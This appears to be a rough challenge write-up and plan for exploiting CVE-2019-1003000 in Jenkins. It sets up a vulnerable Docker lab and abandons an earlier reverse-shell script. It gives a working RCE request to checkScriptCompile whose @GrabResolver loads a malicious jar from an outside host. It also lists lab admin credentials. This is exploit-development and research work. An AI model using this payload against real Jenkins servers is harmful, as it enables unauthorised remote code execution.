CVE-2019-1003000 Exploit

I. Pre Development Phase
    1. Reading Orange.tw's exploit code, he used his own domain to host the malicious .jar file however there a github repo that embeds the payload within the script. I am going
    to create a malicious domain and host the jar file there and play around with that first. If not, I'll embed the payload in my program
1. Process Command Line Arguments
    [XXX]a. username 
    [XXX]b. password
    [XXX]c. url of target (in this it will be localhost with exposed port from shell script)
        i. log in via rest api and confirm that login was successful - first check
        ii. On success of login
    c. Will try to methods and will see which one works
        i. Will either host a domain with a malicious payload (.jar file) that will execute a bash script or powershell script
            a. Save host domain in constant
        ii. Will include the payload directly in the c sharp file
2. Make GET request to Jenkins REST API
    a. Once connection is verified from previous steps, construct the GET the request
        i. Check status of Get request - second check
    b. The jar file should launch a bash script that sends a simple command to the domain hosting the malicious fie
    c. pull file name from web site
        i. wil have a check. if local file name in program equals that file name then the exploit worked and the vulnerability exists
        
        
        http://localhost:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?
        value=@GrabResolver(name=%27orange.tw%27,%20root=%27http://10.252.10.157/%27)
        @Grab(group=%27jenkins%27,%20module=%27poc%27,%20version=%271%27)%0aimport%20NixExploit
        
        
Summary

Environment Setup
I created the vulnerale jenkins environment in a Docker container. Below is the series of steps I went about to create the 
vunerable version.
    1. I first pulled the specified docker version (from the challenge instructions) from DockerHuba: `docker pull jenkins/jenkins:2.121`
    2. I then wrote an SSH script to launch a new docker container running the vulnerable Jenkins server and bind mounted it to the local machine
     1. f32bc9071c104539a2ace0f8fa5d143f [the original password given whe setting up Jenkins]
     2. Create first admin user
        a. username - Naruto
        b. Password - Uzumaki
        c. Name - Naruto
    3. I then navigated to plugins.index.io to find specific plug in versions to install into Jenkins
    1. Declarative Plugin - https://updates.jenkins.io/download/plugins/pipeline-model-definition/
    2. Groovy - https://updates.jenkins.io/download/plugins/workflow-cps/
    3. Then the other two shits
4. Manage plugins to install them and then I had uncheck the command that would always look for new updates so it woudn't
    autoupdate everytime the Jenkins server restarted
    
Execution
The initial planning that I had created was a good framework for how I went about solving the solution; however, as I went about
it I discovered that I was making a lot of the work more complicated than it needed to be. I had initally created a bash script
to launch a reverse shell to my hose machine. However, the goal of this challenge was to prove that the vulnerability existed.
In this instance, it was to prove that RCE could be launched on Jenkins [fill in vulnerable versions here], I don't need to
actually create a reverse shell and show that I can launch arbiraty commands. Because of this, it makes it easier to detect
on both Windows and *nix based operating systems. After making the GET request, I found that the page will respond with a status
marked as success of it will print an error message. However to prove that the status success wasn't a false positive, I set up
a web server on my host (python -n SimpleHTTPSever 80) and upon launching the custom GET request to the specified JAR file,
it can be seen that the GET request response with a 200 status code with the correct path to the jar file that is seen on the 
local machine.

******* REMINDER *********
        functino for acl bypass should be a bool. no need for async and wait since its conditional
        create request to iterate thorough a-z index onces it confirms it can be bypassed ,then mark as true and move on to
        the main function
        
        create docker environment that is up to date and show test
        
        
        add pictures of work and whatnot to the write up
        
        if time do the python thing or at least try